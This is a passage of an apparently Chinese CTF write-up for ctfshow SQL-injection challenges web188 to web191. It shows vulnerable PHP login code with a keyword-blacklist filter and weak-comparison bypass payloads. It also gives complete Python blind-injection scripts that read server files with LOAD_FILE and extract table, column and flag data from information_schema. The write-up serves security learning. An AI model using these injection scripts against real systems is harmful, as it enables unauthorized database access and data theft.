viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>payload:</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">username=0&amp;password=0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>解释：</p>
<p>在<code>where username=0</code>这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来</p>
<p>而if($row[&#x27;pass&#x27;]==intval($password)) 也是弱比较，查出来的也是字母开头的</p>
<p>参考文章：<a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web189">web189<a href="#web189" class="hash-link" aria-label="Direct link to web189" title="Direct link to web189">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//拼接sql语句查找指定ID用户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select pass from ctfshow_user where username = {$username}&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//用户名检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>依旧是新知识，因 为题目给了flag在/api/index.php中</p>
<p>这里用到的函数的load_file()，用法一般是<code>select load_file(xxxx)</code></p>
<blockquote>
<p><strong>LOAD_FILE(file_name)：</strong> 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。</p>
<p><strong>regexp：</strong> mysql中的正则表达式操作符</p>
</blockquote>
<p>这里就用load_file配合regexp来进行盲注，如果正则匹配到了，说明我们的第flag+str(j)是正确的，以此来得到flag，密码还是用0</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://ad8042a2-7168-43e3-aee6-7302c26fc3f5.challenge.ctf.show/api/&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;ctfshow&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">table </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;0123456789abcdef{}-_&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> table</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">flag</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&#x27;),0,1)&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                   </span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">r&#x27;\u5bc6\u7801\u9519\u8bef&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;}&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web190">web190<a href="#web190" class="hash-link" aria-label="Direct link to web190" title="Direct link to web190">​</a></h3>
<p>190的题目 描述是 “不饿”</p>
<p>哦，换区域了，这里开始是bool盲注</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //拼接sql语句查找指定ID用户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select pass from ctfshow_user where username = &#x27;{$username}&#x27;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //TODO:感觉少了个啥，奇怪</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>少了啥 没少啥啊，好像就取消了过滤感觉</p>
<p>哦草，没api/index.php了</p>
<p>顺便还发现flag不在ctfshow_user，嗯重新弄一下找 找看。但是也只能通过盲注，这里如果用sqlmap应该能一把梭出来，因为太标准了。</p>
<p>首先把大框架写好，因为登录只会提示没有用户名和密码错误</p>
<p>这是一个大框架，这个payload是查询表名</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://bfa46133-bd43-47a8-85f7-8c26d97a6838.challenge.ctf.show/api/&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27; &#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1,0)-- -&quot;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">#取表名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">114514</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">r&#x27;\u5bc6\u7801\u9519\u8bef&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1,0)-- -&quot;</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic">#取列名</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; or if(ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1,0)-- -&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#拿flag</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</blockquote>
<p>最后就能得到flag</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web191">web191<a href="#web191" class="hash-link" aria-label="Direct link to web191" title="Direct link to web191">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==$password){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //TODO:感觉少了个啥，奇怪</span><br></span><span class="token-line" 